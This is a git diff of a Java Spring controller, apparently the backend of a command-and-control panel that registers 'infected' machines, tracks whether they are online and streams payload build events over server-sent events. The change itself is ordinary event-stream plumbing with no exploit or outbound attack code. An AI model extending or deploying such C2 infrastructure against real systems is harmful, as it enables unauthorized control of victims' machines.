@@ -3,18 +3,23 @@ package at.simcc.simcc_backend.api.controller;
 import at.simcc.simcc_backend.api.body.InfectedRegistrationRequest;
 import at.simcc.simcc_backend.api.body.InfectedOnlineWrapper;
 import at.simcc.simcc_backend.api.service.InfectedService;
+import at.simcc.simcc_backend.api.sse.BuildCompleteEvent;
+import at.simcc.simcc_backend.api.sse.BuildFailedEvent;
+import at.simcc.simcc_backend.api.sse.InfectedSSEComponent;
 import at.simcc.simcc_backend.entities.Infected;
 import at.simcc.simcc_backend.models.InfectedIdDto;
 import at.simcc.simcc_backend.models.InfectedWithLatestIPDto;
 import jakarta.servlet.http.HttpServletRequest;
 import lombok.RequiredArgsConstructor;
 import lombok.extern.slf4j.Slf4j;
+import org.apache.catalina.Server;
 import org.springframework.http.MediaType;
 import org.springframework.http.ResponseEntity;
 import org.springframework.validation.annotation.Validated;
 import org.springframework.http.codec.ServerSentEvent;
 import org.springframework.web.bind.annotation.*;
 import reactor.core.publisher.Flux;
+import tools.jackson.databind.ObjectMapper;
 
 import java.net.Inet4Address;
 import java.net.InetAddress;
@@ -35,6 +40,8 @@ import java.util.UUID;
 @RequiredArgsConstructor
 public class InfectedController {
     private final InfectedService infectedService;
+    private final InfectedSSEComponent infectedSSEComponent;
+    private final ObjectMapper objMapper;
 
     /**
      * Route to register a newly infected machine
@@ -81,22 +88,14 @@ public class InfectedController {
      * @param iid {@code iid} of the infected
      * @return event of type {@code is-online} to
      */
-    @GetMapping(path = "/register-status/{iid}", produces = MediaType.TEXT_EVENT_STREAM_VALUE)
-    public Flux<ServerSentEvent<InfectedOnlineWrapper>> streamFlux(@PathVariable UUID iid) {
-        Optional<Infected> infected = infectedService.getInfectedComplete(iid);
-        InfectedOnlineWrapper infectedOnlineWrapper = new InfectedOnlineWrapper(
-                infected.isPresent(),
-                infected.isPresent()
-                        ? infected.get().isOnline()
-                        : null
-        );
-
-        return Flux.interval(Duration.ofSeconds(1))
-                .map(sequence -> ServerSentEvent.<InfectedOnlineWrapper> builder()
-                    .id(String.valueOf(sequence))
-                    .event("is-online")
-                    .data(infectedOnlineWrapper)
-                    .build()
+    @GetMapping(path = "/sse/status", produces = MediaType.TEXT_EVENT_STREAM_VALUE)
+    public Flux<ServerSentEvent<String>> streamFlux() {
+        return infectedSSEComponent.getSseSink().asFlux()
+                .map(event -> ServerSentEvent.<String>builder()
+                        .id(UUID.randomUUID().toString())
+                        .event("status.updated")
+                        .data(objMapper.writeValueAsString(event))
+                        .build()
                 );
     }
 
